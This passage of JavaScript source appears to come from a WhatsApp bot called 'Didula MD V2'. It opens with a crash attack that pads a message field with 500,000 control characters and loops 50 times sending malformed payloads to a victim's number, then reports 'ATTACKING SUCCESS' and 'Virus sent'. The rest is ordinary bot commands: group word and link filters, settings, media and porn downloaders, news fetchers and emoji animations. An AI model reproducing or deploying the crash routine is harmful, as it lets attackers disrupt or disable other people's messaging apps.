                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }        

target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(conn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(conn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(conn, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
} catch (e) {
reply('*Error !!*')
l(e)
}
})










cmd({
    on: "body"
}, async (conn, mek, m, { from, body, isGroup, isAdmins, isBotAdmins, sender }) => {
    try {
        // Check if recording is enabled in the config
        if (config.RECORDING === 'true') {
            // Update presence to 'recording'
            await conn.sendPresenceUpdate('recording', from);
        }
    } catch (error) {
        console.error("Error processing message:", error);
        // You can choose to handle the error as needed here
    }
});

cmd({
  on: "body"
},
async (conn,mek, m, { from, body, isGroup, isAdmins, isBotAdmins, reply, sender }) => {
    try {
    
        const badWords = ["wtf", "mia","පොන්නයා","හැමිනෙනවා","කැරියා", "හුත්තා", "හුත්තා","පකයා","fuck","sex","huththa","pakaya","ponnaya","hutto","kariya","pakaya","hukapan","hukanna","hutto","xvdl","hutto","Hukapamm","lol"]
        if (!isGroup || isAdmins || !isBotAdmins) return; 
      
        const lowerCaseMessage = body.toLowerCase();
        const containsBadWord = badWords.some(word => lowerCaseMessage.includes(word));
        
        if (containsBadWord & config.ANTI_BAD === 'true') {
          await conn.sendMessage(from, { delete: mek.key }, { quoted: mek });
          await conn.sendMessage(from, { text: "⚠️BAD WORDS NOT ALLOWED⚠️ " }, { quoted: mek });
          await conn.groupParticipantsUpdate(from, [sender], 'remove');
        }
    } catch (error) {
        console.error(error)
        reply("An error occurred while processing the message.")
    }
})
const linkPatterns = [
    /https?:\/\/(?:chat\.whatsapp\.com|wa\.me)\/\S+/gi,   
    /https?:\/\/(?:t\.me|telegram\.me)\/\S+/gi,           
    /https?:\/\/(?:www\.)?linkedin\.com\/\S+/gi,         
    /https?:\/\/(?:www\.)?snapchat\.com\/\S+/gi,         
    /https?:\/\/(?:www\.)?pinterest\.com\/\S+/gi,         
    /https?:\/\/(?:www\.)?reddit\.com\/\S+/gi,            
    /https?:\/\/ngl\/\S+/gi,                             
    /https?:\/\/(?:www\.)?discord\.com\/\S+/gi,           
    /https?:\/\/(?:www\.)?twitch\.tv\/\S+/gi,             
    /https?:\/\/(?:www\.)?vimeo\.com\/\S+/gi,            
    /https?:\/\/(?:www\.)?dailymotion\.com\/\S+/gi,      
    /https?:\/\/(?:www\.)?medium\.com\/\S+/gi,
               
];

cmd({
    on: "body"
}, async (conn, mek, m, { from, body, sender, isGroup, isAdmins, isBotAdmins, reply }) => {
    try {
        if (!isGroup || isAdmins || !isBotAdmins) return; // Skip if not in group, or sender is admin, or bot is not admin

        const containsLink = linkPatterns.some(pattern => pattern.test(body));

        if (containsLink && config.ANTI_LINK === 'true') {
            // Delete the message
            await conn.sendMessage(from, { delete: mek.key }, { quoted: mek });

            // Warn the user
            await conn.sendMessage(from, { text: `⚠️ Links are not allowed in this group.\n@${sender.split('@')[0]} has been removed. 🚫`, mentions: [sender] }, { quoted: mek });

             // Remove the user from the group
            await conn.groupParticipantsUpdate(from, [sender], 'remove');
        }
    } catch (error) {
        console.error(error);
        reply("An error occurred while processing the message.");
    }
});







cmd({
    pattern: "settings",
    alias: ["setting", "set"],
    desc: "Bot settings management",
    react: "⚙️",
    category: "owner"
},
async (conn, mek, m, { from, q, reply, isOwner }) => {
    if (!isOwner) return reply("Owner only command!");

    try {
        // Handle direct setting changes if command is "set"
        if (q && m.command === "set") {
            const [key, value] = q.split(':').map(item => item.trim());
            if (!key || !value) return reply("Format: set SETTING:VALUE");

            const validSettings = {
                MODE: ['public', 'private', 'group', 'inbox'],
                AUTO_SONG_SENDER: ['true', 'false'],
                AUTO_READ_STATUS: ['true', 'false'],
                AI_CHAT: ['true', 'false'],
                RECORDING: ['true', 'false'],
                READ_CMD: ['true', 'false'],
                ANTI_BAD: ['true', 'false'],
                ANTI_LINK: ['true', 'false'],
                ANTI_CALL: ['true', 'false'],
                ANTI_DELETE: ['true', 'false'],
                ANTI_BOT: ['true', 'false']
            };

            if (!validSettings[key]) {
                return reply("Invalid setting! Check settings menu.");
            }

            if (!validSettings[key].includes(value.toLowerCase())) {
                return reply(`Invalid value for ${key}! Valid values: ${validSettings[key].join('/')}`);
            }

            await updateEnv(key, value);
            reply(`✅ Updated ${key} to ${value}`);
            return reply("Type .restart for get new update ");
        }

        // Display settings menu
        const desc = `┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃       ⚙️ *Didula MD V2* ⚙️
┃━━━━━━━━━━━━━━━━━━━━━━━┃
┣━💼 *Work Mode* : *𝙿𝚄𝙱𝙻𝙸𝙲🌎/𝙿𝚁𝙸𝚅𝙰𝚃𝙴/𝙸𝙽𝙱𝙾𝚇/𝙶𝚁𝙾𝚄𝙿*
┣━🎵 *Auto Song* : *♻️ 𝙾𝙽/𝙾𝙵𝙵*
┣━📝 *Auto Status* : *♻️ 𝙾𝙽/𝙾𝙵𝙵*
┣━🤖 *AI Chat* : *♻️ 𝙾𝙽/𝙾𝙵𝙵*
┣━⌨️ *Recording* : *♻️ 𝙾𝙽/𝙾𝙵𝙵*
┣━🛠️ *Read Command* : *♻️ 𝙾𝙽/𝙾𝙵𝙵*
┣━❌ *Anti Bad* : *♻️ 𝙾𝙽/𝙾𝙵𝙵*
┣━🔗 *Anti Link* : *♻️ 𝙾𝙽/𝙾𝙵𝙵*
┣━📞 *Anti Call* : *♻️ 𝙾𝙽/𝙾𝙵𝙵*
┣━🗑️ *Anti Delete* : *♻️ 𝙾𝙽/𝙾𝙵𝙵*
┣━🤖 *Anti Bot* : *♻️ 𝙾𝙽/𝙾𝙵𝙵*
┗━━━━━━━━━━━━━━━━━━━━━━━┛

*Available Options:*

1️⃣ *Work Mode*
   1.1 🌐 Public
   1.2 🔒 Private 
   1.3 👥 Group Only
   1.4 💬 Inbox Only

2️⃣ *Auto Song*
   2.1 ✅ On
   2.2 ❌ Off

3️⃣ *Auto Status*
   3.1 ✅ On
   3.2 ❌ Off

4️⃣ *AI Chat*
   4.1 ✅ On
   4.2 ❌ Off

5️⃣ *Recording*
   5.1 ✅ On
   5.2 ❌ Off

6️⃣ *Read Command*
   6.1 ✅ On
   6.2 ❌ Off

7️⃣ *Anti Bad*
   7.1 ✅ On
   7.2 ❌ Off

8️⃣ *Anti Link*
   8.1 ✅ On
   8.2 ❌ Off

9️⃣ *Anti Call*
   9.1 ✅ On
   9.2 ❌ Off

🔟 *Anti Delete*
   10.1 ✅ On
   10.2 ❌ Off

1️⃣1️⃣ *Anti Bot*
    11.1 ✅ On
    11.2 ❌ Off

Reply with option number to change setting`;

        const vv = await conn.sendMessage(from, { 
            image: { url: config.ALIVE_IMG }, 
            caption: desc 
        }, { quoted: mek });

        // Settings option mapping
        const settings = {
            '1.1': ['MODE', 'public'],
            '1.2': ['MODE', 'private'],
            '1.3': ['MODE', 'group'],
            '1.4': ['MODE', 'inbox'],
            '2.1': ['AUTO_SONG_SENDER', 'true'],
            '2.2': ['AUTO_SONG_SENDER', 'false'],
            '3.1': ['AUTO_READ_STATUS', 'true'],
            '3.2': ['AUTO_READ_STATUS', 'false'],
            '4.1': ['AI_CHAT', 'true'],
            '4.2': ['AI_CHAT', 'false'],
            '5.1': ['RECORDING', 'true'],
            '5.2': ['RECORDING', 'false'],
            '6.1': ['READ_CMD', 'true'],
            '6.2': ['READ_CMD', 'false'],
            '7.1': ['ANTI_BAD', 'true'],
            '7.2': ['ANTI_BAD', 'false'],
            '8.1': ['ANTI_LINK', 'true'],
            '8.2': ['ANTI_LINK', 'false'],
            '9.1': ['ANTI_CALL', 'true'],
            '9.2': ['ANTI_CALL', 'false'],
            '10.1': ['ANTI_DELETE', 'true'],
            '10.2': ['ANTI_DELETE', 'false'],
            '11.1': ['ANTI_BOT', 'true'],
            '11.2': ['ANTI_BOT', 'false']
        };

        // Handle option selection
        const optionHandler = async (msg) => {
            if (!msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) return;
            if (msg.message.extendedTextMessage.contextInfo.stanzaId !== vv.key.id) return;

            const option = msg.message.extendedTextMessage.text?.trim();
            
            if (settings[option]) {
                const [setting, value] = settings[option];
                await reply(`.set ${setting}:${value}`);
                await reply("Type .restart for get new update ");
            } else {
                reply("Invalid option selected!");
            }
        };

        // Set up message listener
        const messageHandler = ({ messages }) => {
            const msg = messages[0];
            optionHandler(msg);
        };

        conn.ev.on('messages.upsert', messageHandler);

        // Clean up listener after 5 minutes
        setTimeout(() => {
            conn.ev.off('messages.upsert', messageHandler);
        }, 300000);

    } catch (error) {
        console.error(error);
        await conn.sendMessage(from, { react: { text: '❌', key: mek.key }});
        reply('Error processing request.');
    }
});

cmd({ 
    pattern: "movie", 
    alias: ["film", "cinema"], 
    react: "🎬", 
    desc: "Search and Download Movies with Sinhala Subtitles", 
    category: "main", 
    use: '.movie < Movie Name >', 
    filename: __filename 
}, async (conn, mek, m, { from, prefix, quoted, q, reply }) => { 
    try { 
        if (!q) return await reply("⚠️ Please provide a movie name!");

        // Search for the movie
        let searchUrl = `https://omindu-api.up.railway.app/api/sinhalasub/search?query=${encodeURIComponent(q)}`;
        let searchResponse = await fetch(searchUrl);
        let searchData = await searchResponse.json();

        if (!searchData.results.movies || searchData.results.movies.length < 1) 
            return reply("❌ No movies found!");

        let movie = searchData.results.movies[0];

        // Get download links
        let downloadUrl = `https://omindu-api.up.railway.app/api/sinhalasub/download?url=${encodeURIComponent(movie.link)}`;
        let downloadResponse = await fetch(downloadUrl);
        let downloadData = await downloadResponse.json();

        let movieInfo = downloadData.info;
        let dlLinks = downloadData.dl_links;

        let movieMsg = `╭━━━〔 *🌟 DIDULA MD V2 🌟* 〕━━━┈⊷
┃▸╭─────────────────
┃▸┃ 🎬 *MOVIE DOWNLOADER*
┃▸└─────────────────···
╰──────────────────────┈⊷
╭━━❐━⪼
┇📌 *Title:* ${movieInfo.title}
┇📅 *Release Date:* ${movieInfo.release_date}
┇⏱️ *Runtime:* ${movieInfo.runtime}
┇⭐ *TMDB Rating:* ${movieInfo.tmdb_Rating}
┇🎭 *Genres:* ${movieInfo.genres.join(", ")}
┇🎬 *Director:* ${movieInfo.director.name}
╰━━❑━⪼

📥 *Download Links:*

*Server 1:*
${dlLinks.server_01.map(link => `▢ ${link.quality} (${link.size})\n${link.link}`).join('\n\n')}

*Telegram:*
${dlLinks.telagram.map(link => `▢ ${link.quality} (${link.size})\n${link.link}`).join('\n\n')}

*Server 2:*
${dlLinks.server_02.map(link => `▢ ${link.quality} (${link.size})\n${link.link}`).join('\n\n')}

*Server 3:*
${dlLinks.server_03.map(link => `▢ ${link.quality} (${link.size})\n${link.link}`).join('\n\n')}

*Type . dl <download link> for download movie 💗😚*

*💫 Quality Movie Downloader By Didula MD V2*`;

        await conn.sendMessage(from, { 
            image: { url: movieInfo.poster }, 
            caption: movieMsg 
        }, { quoted: mek });

    } catch (e) {
        console.log(e);
        reply("❌ An error occurred. Please try again later.");
    }
});


cmd({
    pattern: "itnnews",
    desc: "Get the latest ITN news headlines or details of a given link.",
    category: "news",
    react: "📰",
    filename: __filename
},
async (conn, mek, m, { from, reply, q }) => {
    try {
        const rssFeedUrl = 'https://www.itnnews.lk/feed/';
        const response = await axios.get(rssFeedUrl);
        const xmlData = response.data;

        const parser = new xml2js.Parser();
        const result = await parser.parseStringPromise(xmlData);

        const newsItems = result.rss.channel[0].item.map(item => ({
            title: item.title[0],
            link: item.link[0],
            description: item.description[0],
            pubDate: item.pubDate[0]
        }));

        // User එකට link එකක් දීලා search කරොත්
        if (q && q.startsWith("https://www.itnnews.lk/")) {
            const article = newsItems.find(news => news.link === q.trim());
            if (!article) return reply("❌ Sorry, this news article was not found in the latest updates!");

            let articleText = `*Didula MD V2 - 📰 ITN News Details:*\n\n`;
            articleText += `📌 *${article.title}*\n`;
            articleText += `📅 _${article.pubDate}_\n`;
            articleText += `📖 ${article.description}\n`;
            articleText += `🔗 ${article.link}\n\n> ᴩʀᴏᴊᴇᴄᴛꜱ ᴏꜰ ᴅɪᴅᴜʟᴀ ʀᴀꜱʜᴍɪᴋᴀ`;

            return reply(articleText);
        }

        // User එක link එකක් දීලා නැත්නම් Latest 5 news return කරනවා
        let newsText = `*📰 ITN Latest News:*\n\n`;
        newsItems.slice(0, 5).forEach((news, index) => {
            newsText += `📌 *${index + 1}.* *${news.title}*\n`;
            newsText += `📅 _${news.pubDate}_\n`;
            newsText += `🔗 ${news.link}\n\n\n> ᴩʀᴏᴊᴇᴄᴛꜱ ᴏꜰ ᴅɪᴅᴜʟᴀ ʀᴀꜱʜᴍɪᴋᴀ`;
        });

        reply(newsText);
    } catch (error) {
        console.error("Error fetching ITN News:", error);
        reply("❌ Could not fetch ITN news. Please try again later.");
    }
});














cmd({
    pattern: "pornhub",
    alias: ["ph"],
    react: "🎥",
    desc: "download xVideo",
    category: "download",
    filename: __filename
},
async(conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
    try {
        if (!q) return reply("*⚠️ Please provide a video title or URL*\n\n*Example:* .xvideo Nicolette");

        const query = String(q);
        const searchResponse = await axios.get(`https://ipa-oya.vercel.app/api/ph?q=${encodeURIComponent(query)}`);

        const deta = searchResponse.data;
        const videoUrl = deta.url;

        let desc = `🎥 *Didula MD V2 - Now Downloading:* ${deta.title}

⏳ *Please wait, processing your request...*`;

        await conn.sendMessage(from, { 
            image: { url: deta.image }, 
            caption: desc 
        }, { quoted: mek }).catch(() => reply("❌ Error sending thumbnail"));

        try {
            const downloadResponse = await axios.get(`https://ipa-oya.vercel.app/api/phdl?q=${encodeURIComponent(videoUrl)}`);
            const downloadUrls = downloadResponse.data;

            if (!downloadUrls || downloadUrls.length === 0) {
                return reply("❌ No download links found.");
            }

            let downloadMessage = "🎥 *Didula MD V2 Successfully Downloaded!*\n\nAvailable Resolutions:\n";
            downloadUrls.forEach((video) => {
                downloadMessage += `- ${video.resolution}p: ${video.download_url}\n`;
            });

            // Send the first download link as a video message
            const firstDownloadUrl = downloadUrls[0].download_url;
            await conn.sendMessage(from, { 
                video: { url: firstDownloadUrl }, 
                caption: downloadMessage 
            }, { quoted: mek });

        } catch (error) {
            reply("❌ Error fetching download links: " + error.message);
        }

    } catch (e) {
        console.log(e);
        reply(`❌ Error: ${e.message}`);
    }
});


cmd({
    pattern: "xvideo",
    alias: ["xvideo2"],
    react: "🎥",
    desc: "download",
    category: "download",
    filename: __filename
},
async(conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
    try {
        if (!q) return reply("*⚠️ Please provide a video title or URL*\n\n*Example:* .xvideo My MILF Secretary Love");

        const query = String(q);
        const searchResponse = await axios.get(`https://api.giftedtech.my.id/api/search/xvideossearch?apikey=gifted&query=${encodeURIComponent(query)}`);

        if (!searchResponse.data.results || !searchResponse.data.results.length) {
            return reply("❌ No results found! Please try another search.");
        }

        const deta = searchResponse.data.results[0];
        const videoUrl = deta.url;

        let desc = `🎥 *Didula MD V2 - Now Downloading:* ${deta.title}

⏱️ *Duration:* ${deta.duration}
👁️ *Views:* ${deta.views || 'N/A'}
📅 *Quality:* ${deta.quality || 'N/A'}

⏳ *Please wait, processing your request...*`;

        await conn.sendMessage(from, { 
            image: { url: deta.thumb }, 
            caption: desc 
        }, { quoted: mek }).catch(() => reply("❌ Error sending thumbnail"));

        try {
            const downloadResponse = await axios.get(`https://api.giftedtech.my.id/api/download/xvideosdl?apikey=gifted&url=${encodeURIComponent(videoUrl)}`);

            const downloadUrl = downloadResponse.data.result.download_url;

            await conn.sendMessage(from, { 
                video: { url: downloadUrl }, 
                mimetype: "video/mp4", 
                caption: "🎥 *Didula MD V2 Successfully Downloaded!*" 
            }, { quoted: mek });

        } catch (error) {
            reply("❌ Error downloading video: " + error.message);
        }

    } catch (e) {
        console.log(e);
        reply(`❌ Error: ${e.message}`);
    }
});




cmd({
    pattern: "hirucheck",
    alias: ["hirunews","newshiru","hirulk"],
    react: "⭐",
    category: "search",
    desc: "Fetch the latest news from the SUHAS API in Hiru API.",
    use: "",
    filename: __filename,
},
    async (conn, mek, m, {
        from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber,
        botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName,
        participants, groupAdmins, isBotAdmins, isAdmins, reply
    }) => {
        try {
            const apiUrl = `https://suhas-bro-apii.vercel.app/hiru`;
//Dont Change This API Key
            const response = await axios.get(apiUrl);
            const data = response.data;

            if (!data || !data.newsURL || !data.title || !data.image || !data.text) {
                return reply(`*No News Available At This Moment* ❗`);
            }

            const { newsURL, title, image, text, Power } = data;

            let newsInfo = "𝐃𝐢𝐝𝐮𝐥𝐚 𝐌𝐃 𝐕𝟐 𝐍𝐞𝐰𝐬 📰\n\n";
            newsInfo += `✨ *Title*: ${title}\n\n`;
            newsInfo += `📑 *Description*:\n${text}\n\n`;
            newsInfo += `⛓️‍💥 *Url*: www.hirunews.lk\n\n`;
            newsInfo += `> *ᴩʀᴏᴊᴇᴄᴛꜱ ᴏꜰ ᴅɪᴅᴜʟᴀ ʀᴀꜱʜᴍɪᴋᴀ*`;

            if (image) {
                await conn.sendMessage(m.chat, {
                    image: { url: image },
                    caption: newsInfo,
                }, { quoted: m });
            } else {
                await conn.sendMessage(m.chat, { text: newsInfo }, { quoted: m });
            }

        } catch (error) {
            console.error(error);
            reply(`*An Error Occurred While Fetching News At This Moment* ❗`);
        }
    }
);




const { ytsearch, ytmp3, ytmp4 } = require('@dark-yasiya/yt-dl.js'); 

// video

cmd({ 
    pattern: "video", 
    alias: ["video2", "play"], 
    react: "🎥", 
    desc: "Download Youtube song", 
    category: "main", 
    use: '.song < Yt url or Name >', 
    filename: __filename 
}, async (conn, mek, m, { from, prefix, quoted, q, reply }) => { 
    try { 
        if (!q) return await reply("⚠️ Please provide a YouTube URL or song name!");

        const yt = await ytsearch(q);
        if (yt.results.length < 1) return reply("❌ No results found!");

        let yts = yt.results[0];  
        let apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(yts.url)}`;

        let response = await fetch(apiUrl);
        let data = await response.json();

        if (data.status !== 200 || !data.success || !data.result.download_url) {
            return reply("⚠️ Failed to fetch the video. Please try again later.");
        }

        let ytmsg = `╭━━━〔 *🌟 DIDULA MD V2 🌟* 〕━━━┈⊷
┃▸╭─────────────────
┃▸┃ 📽️ *VIDEO DOWNLOADER*
┃▸└─────────────────···
╰──────────────────────┈⊷
╭━━❐━⪼
┇📌 *Title:* ${yts.title}
┇⏱️ *Duration:* ${yts.timestamp}
┇👀 *Views:* ${yts.views}
┇👤 *Author:* ${yts.author.name}
┇🔗 *Link:* ${yts.url}
╰━━❑━⪼

*💫 Quality Video Downloader By Didula MD V2*`;

        await conn.sendMessage(from, { image: { url: data.result.thumbnail || '' }, caption: ytmsg }, { quoted: mek });
        await conn.sendMessage(from, { video: { url: data.result.download_url }, mimetype: "video/mp4" }, { quoted: mek });
        await conn.sendMessage(from, { 
            document: { url: data.result.download_url }, 
            mimetype: "video/mp4", 
            fileName: `${data.result.title}.mp4`, 
            caption: `🎥 *${yts.title}*\n\n*🌟 Created By:* Didula Rashmika\n*🤖 Bot:* Didula MD V2`
        }, { quoted: mek });

    } catch (e) {
        console.log(e);
        reply("❌ An error occurred. Please try again later.");
    }
});  

cmd({ 
     pattern: "song", 
     alias: ["ytdl3", "yta"], 
     react: "🎵", 
     desc: "Download Youtube song",
     category: "main", 
     use: '.song < Yt url or Name >', 
     filename: __filename 
}, async (conn, mek, m, { from, prefix, quoted, q, reply }) => { 
    try { 
        if (!q) return await reply("⚠️ Please provide a YouTube URL or song name!");

        const yt = await ytsearch(q);
        if (yt.results.length < 1) return reply("❌ No results found!");

        let yts = yt.results[0];  
        let apiUrl = `https://apis.davidcyriltech.my.id/youtube/mp3?url=${encodeURIComponent(yts.url)}`;

        let response = await fetch(apiUrl);
        let data = await response.json();

        if (data.status !== 200 || !data.success || !data.result.downloadUrl) {
            return reply("⚠️ Failed to fetch the audio. Please try again later.");
        }

        let ytmsg = `╭━━━〔 *🌟 DIDULA MD V2 🌟* 〕━━━┈⊷
┃▸╭─────────────────
┃▸┃ 🎵 *MUSIC DOWNLOADER*
┃▸└─────────────────···
╰──────────────────────┈⊷
╭━━❐━⪼
┇🎧 *Title:* ${yts.title}
┇⏱️ *Duration:* ${yts.timestamp}
┇👀 *Views:* ${yts.views}
┇👤 *Author:* ${yts.author.name}
┇🔗 *Link:* ${yts.url}
╰━━❑━⪼

*💫 High Quality Audio By Didula MD V2*`;

        await conn.sendMessage(from, { image: { url: data.result.image || '' }, caption: ytmsg }, { quoted: mek });
        await conn.sendMessage(from, { audio: { url: data.result.downloadUrl }, mimetype: "audio/mpeg" }, { quoted: mek });
        await conn.sendMessage(from, { 
            document: { url: data.result.downloadUrl }, 
            mimetype: "audio/mpeg", 
            fileName: `${data.result.title}.mp3`, 
            caption: `🎵 *${yts.title}*\n\n*🌟 Created By:* Didula Rashmika\n*🤖 Bot:* Didula MD V2`
        }, { quoted: mek });

    } catch (e) {
        console.log(e);
        reply("❌ An error occurred. Please try again later.");
    }
});


cmd({
    pattern: "happy",
    desc: "Displays a dynamic edit msg for fun.",
    category: "other",
    react: "😂",
    filename: __filename
},
async (conn, mek, m, { from, reply }) => {
    try {
        const loadingMessage = await conn.sendMessage(from, { text: '😂' });
        const emojiMessages = [
            "😃", "😄", "😁", "😊", "😎", "🥳",
            "😸", "😹", "🌞", "🌈", "😃", "😄",
            "😁", "😊", "😎", "🥳", "😸", "😹",
            "🌞", "🌈", "😃", "😄", "😁", "😊"
        ];

        for (const line of emojiMessages) {
            await new Promise(resolve => setTimeout(resolve, 1000)); // Delay for 1 second
            await conn.relayMessage(
                from,
                {
                    protocolMessage: {
                        key: loadingMessage.key,
                        type: 14,
                        editedMessage: {
                            conversation: line,
                        },
                    },
                },
                {}
            );
        }
    } catch (e) {
        console.log(e);
        reply(`❌ *Error!* ${e.message}`);
    }
});

cmd({
    pattern: "heart",
    desc: "Displays a dynamic edit msg for fun.",
    category: "other",
    react: "❤️",
    filename: __filename
},
async (conn, mek, m, { from, reply }) => {
    try {
        const loadingMessage = await conn.sendMessage(from, { text: '🖤' });
        const emojiMessages = [
            "💖", "💗", "💕", "🩷", "💛", "💚",
            "🩵", "💙", "💜", "🖤", "🩶", "🤍",
            "🤎", "❤️‍🔥", "💞", "💓", "💘", "💝",
            "♥️", "💟", "❤️‍🩹", "❤️"
        ];

        for (const line of emojiMessages) {
            await new Promise(resolve => setTimeout(resolve, 1000)); // Delay for 1 second
            await conn.relayMessage(
                from,
                {
                    protocolMessage: {
                        key: loadingMessage.key,
                        type: 14,
                        editedMessage: {
                            conversation: line,
                        },
                    },
                },
                {}
            );
        }
    } catch (e) {
        console.log(e);
        reply(`❌ *Error!* ${e.message}`);
    }
});

cmd({
    pattern: "angry",
    desc: "Displays a dynamic edit msg for fun.",
    category: "other",
    react: "🤡",
    filename: __filename
},
async (conn, mek, m, { from, reply }) => {
    try {
        const loadingMessage = await conn.sendMessage(from, { text: '👽' });
        const emojiMessages = [
            "😡", "😠", "🤬", "😤", "😾", "😡",
            "😠", "🤬", "😤", "😾"
        ];

        for (const line of emojiMessages) {
            await new Promise(resolve => setTimeout(resolve, 1000)); // Delay for 1 second
            await conn.relayMessage(
                from,
                {
                    protocolMessage: {
                        key: loadingMessage.key,
                        type: 14,
                        editedMessage: {
                            conversation: line,
                        },
                    },
                },
                {}
            );
        }
    } catch (e) {
        console.log(e);
        reply(`❌ *Error!* ${e.message}`);
    }
});

cmd({
    pattern: "sad",
    desc: "Displays a dynamic edit msg for fun.",
    category: "other",
    react: "😶",
    filename: __filename
},
async (conn, mek, m, { from, reply }) => {
    try {
        const loadingMessage = await conn.sendMessage(from, { text: '😔' });
        const emojiMessages = [
            "🥺", "😟", "😕", "😖", "😫", "🙁",
            "😩", "😥", "😓", "😪", "😢", "😔",
            "😞", "😭", "💔", "😭", "😿"
        ];

        for (const line of emojiMessages) {
            await new Promise(resolve => setTimeout(resolve, 1000)); // Delay for 1 second
            await conn.relayMessage(
                from,
                {
                    protocolMessage: {
                        key: loadingMessage.key,
                        type: 14,
                        editedMessage: {
                            conversation: line,
                        },
                    },
                },
                {}
            );
        }
    } catch (e) {
        console.log(e);
        reply(`❌ *Error!* ${e.message}`);
    }
});

cmd({
    pattern: "shy",
    desc: "Displays a dynamic edit msg for fun.",
    category: "tools",
    react: "🧐",
    filename: __filename
},
async (conn, mek, m, { from, reply }) => {
    try {
        const loadingMessage = await conn.sendMessage(from, { text: '🧐' });
        const emojiMessages = [
            "😳", "😊", "😶", "🙈", "🙊",
            "😳", "😊", "😶", "🙈", "🙊"
        ];

        for (const line of emojiMessages) {
            await new Promise(resolve => setTimeout(resolve, 1000)); // Delay for 1 second
            await conn.relayMessage(
                from,
                {
                    protocolMessage: {
                        key: loadingMessage.key,
                        type: 14,
                        editedMessage: {
                            conversation: line,
                        },
                    },
                },
                {}
            );
        }
    } catch (e) {
        console.log(e);
        reply(`❌ *Error!* ${e.message}`);
    }
});

cmd({
    pattern: "moon",
    desc: "Displays a dynamic edit msg for fun.",
    category: "tools",
    react: "🌚",
    filename: __filename
},
async (conn, mek, m, { from, reply }) => {
    try {
        const loadingMessage = await conn.sendMessage(from, { text: '🌝' });
        const emojiMessages = [
            "🌗", "🌘", "🌑", "🌒", "🌓", "🌔",
            "🌕", "🌖", "🌗", "🌘", "🌑", "🌒",
            "🌓", "🌔", "🌕", "🌖", "🌗", "🌘",
            "🌑", "🌒", "🌓", "🌔", "🌕", "🌖",
            "🌗", "🌘", "🌑", "🌒", "🌓", "🌔",
            "🌕", "🌖", "🌝🌚"
        ];

        for (const line of emojiMessages) {
            await new Promise(resolve => setTimeout(resolve, 1000)); // Delay for 1 second
            await conn.relayMessage(
                from,
                {
                    protocolMessage: {
                        key: loadingMessage.key,
                        type: 14,
                        editedMessage: {
                            conversation: line,
                        },
                    },
                },
                {}
            );
        }
    } catch (e) {
        console.log(e);
        reply(`❌ *Error!* ${e.message}`);
    }
});

cmd({
    pattern: "confused",
    desc: "Displays a dynamic edit msg for fun.",
    category: "tools",
    react: "🤔",
    filename: __filename
},
async (conn, mek, m, { from, reply }) => {
    try {
        const loadingMessage = await conn.sendMessage(from, { text: '🤔' });
        const emojiMessages = [
            "😕", "😟", "😵", "🤔", "😖", 
            "😲", "😦", "🤷", "🤷‍♂️", "🤷‍♀️"
        ];

        for (const line of emojiMessages) {
            await new Promise(resolve => setTimeout(resolve, 1000)); // Delay for 1 second
            await conn.relayMessage(
                from,
                {
                    protocolMessage: {
                        key: loadingMessage.key,
                        type: 14,
                        editedMessage: {
                            conversation: line,
                        },
                    },
                },
                {}
            );
        }
    } catch (e) {
        console.log(e);
        reply(`❌ *Error!* ${e.message}`);
    }
});

cmd({
    pattern: "hot",
    desc: "Displays a dynamic edit msg for fun.",
    category: "tools",
    react: "💋",
    filename: __filename
},
async (conn, mek, m, { from, reply }) => {
    try {
        const loadingMessage = await conn.sendMessage(from, { text: '💋' });
        const emojiMessages = [
            "🥵", "❤️", "💋", "😫", "🤤", 
            "😋", "🥵", "🥶", "🙊", "😻", 
            "🙈", "💋", "🫂", "🫀", "👅", 
            "👄", "💋"
        ];

        for (const line of emojiMessages) {
            await new Promise(resolve => setTimeout(resolve, 1000)); // Delay for 1 second
            await conn.relayMessage(
                from,
                {
                    protocolMessage: {
                        key: loadingMessage.key,
                        type: 14,
                        editedMessage: {
                            conversation: line,
                        },
                    },
                },
                {}
            );
        }
    } catch (e) {
        console.log(e);
        reply(`❌ *Error!* ${e.message}`);
    }
});

cmd({
    pattern: "didula",
    desc: "Displays a dynamic edit msg for fun.",
    category: "tools",
    react: "🗿",
    filename: __filename
},
async (conn, mek, m, { from, reply }) => {
    try {
        const loadingMessage = await conn.sendMessage(from, { text: 'Didula-AI🗿' });

        // Define the ASCII art messages
        const asciiMessages = [
